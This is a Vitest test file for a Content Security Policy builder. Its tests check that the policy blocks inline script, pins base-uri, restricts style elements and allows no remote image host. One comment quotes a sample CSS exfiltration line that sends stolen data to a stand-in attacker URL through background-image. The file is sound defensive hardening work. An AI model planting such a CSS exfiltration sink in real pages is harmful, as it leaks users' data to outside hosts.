import { describe, expect, it } from 'vitest';

import { buildCsp, originOf } from '../../csp';

describe('originOf', () => {
  it('reduces an API URL to its origin', () => {
    expect(originOf('https://movie-api.fly.dev/movies/search?title=lord')).toBe(
      'https://movie-api.fly.dev'
    );
  });

  it('treats a missing or relative URL as same-origin', () => {
    // Nothing to add: 'self' already covers it.
    expect(originOf(undefined)).toBeNull();
    expect(originOf('')).toBeNull();
    expect(originOf('/api')).toBeNull();
  });
});

describe('buildCsp', () => {
  it('allows the API origin so the deployed app can reach its own backend', () => {
    // The failure this guards against is silent: a policy that omits the API
    // leaves every request refused with nothing in the UI to explain it.
    const csp = buildCsp('https://movie-api.fly.dev');

    expect(csp).toContain("connect-src 'self' https://movie-api.fly.dev");
  });

  it('never allows inline script', () => {
    // The whole value of the policy. Vite emits one external module and no
    // inline scripts, so there is no reason to weaken this.
    const csp = buildCsp('https://movie-api.fly.dev');
    const scriptSrc = csp.split('; ').find((d) => d.startsWith('script-src'));

    expect(scriptSrc).toBe("script-src 'self'");
    expect(scriptSrc).not.toContain('unsafe-inline');
    expect(scriptSrc).not.toContain('unsafe-eval');
  });

  it('pins base-uri, so an injected <base> cannot repoint relative scripts', () => {
    expect(buildCsp('https://api.example.com')).toContain("base-uri 'self'");
  });

  it('refuses injected <style> elements while keeping style attributes working', () => {
    // No nonce or hash can cover a style attribute, and React style={{…}} and
    // ag-grid both need them — but stylesheet *elements* can still be pinned
    // to same-origin, so injected <style> blocks are refused.
    const csp = buildCsp('https://api.example.com');

    expect(csp).toContain("style-src-elem 'self'");
    expect(csp).toContain("style-src-attr 'unsafe-inline'");
  });

  it('keeps a permissive style-src fallback so older browsers do not break', () => {
    // A browser that does not know style-src-elem/-attr falls back to
    // style-src. Without 'unsafe-inline' there, every style attribute would be
    // dropped and the layout would collapse.
    const csp = buildCsp('https://api.example.com');
    const styleSrc = csp.split('; ').find((d) => d.startsWith('style-src '));

    expect(styleSrc).toBe("style-src 'self' 'unsafe-inline'");
  });

  it('allows no remote image host, closing the CSS exfiltration sink', () => {
    // Inline styles are only dangerous if CSS can reach the network —
    // background-image: url(https://attacker/?stolen). Films ship poster: null
    // and the client draws a gradient, so no remote host is needed.
    const csp = buildCsp('https://api.example.com');
    const imgSrc = csp.split('; ').find((d) => d.startsWith('img-src'));

    expect(imgSrc).toBe("img-src 'self' data:");
    expect(imgSrc).not.toContain('https:');
  });

  it('drops connect-src to self alone when the API is same-origin', () => {
    const csp = buildCsp('');

    expect(csp).toContain("connect-src 'self';");
  });
});
